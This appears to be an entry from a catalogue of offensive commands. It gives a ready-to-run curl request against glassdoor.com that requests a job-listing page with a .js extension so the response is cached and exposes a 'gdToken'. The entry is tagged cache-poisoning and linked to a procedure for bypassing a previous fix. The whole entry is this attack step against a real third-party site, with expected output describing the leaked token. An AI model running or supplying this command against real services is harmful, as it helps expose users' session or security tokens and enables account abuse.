---
data: 'curl ''https://www.glassdoor.com/job-listing/011.js?jl=1007452474740'''
tags:
  - http
  - cache-poisoning
type: command
executor: bash
platforms:
  - Web
id: 354b65d3-1672-4775-ae79-22bd5afd4446
created_at: '2025-12-13T09:00:34.750Z'
updated_at: '2025-12-13T09:00:34.750Z'
verified: false
validated: true
submitted: true
---
# Get Job Listing JS

## Command

```bash
curl 'https://www.glassdoor.com/job-listing/011.js?jl=1007452474740'
```

## Description

HTTP GET request to a job listing endpoint with .js extension to trigger caching and expose gdToken.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `jl` | Job listing ID, e.g., 1007452474740 | Yes |

## Examples

### Basic Usage

```bash
curl 'https://www.glassdoor.com/job-listing/011.js?jl=1007452474740'
```

## Expected Output

HTTP 200 OK with response body containing cached content and gdToken.

## Related

- [[procedures/Bypass-Previous-Fix-via-URL-Caching]]
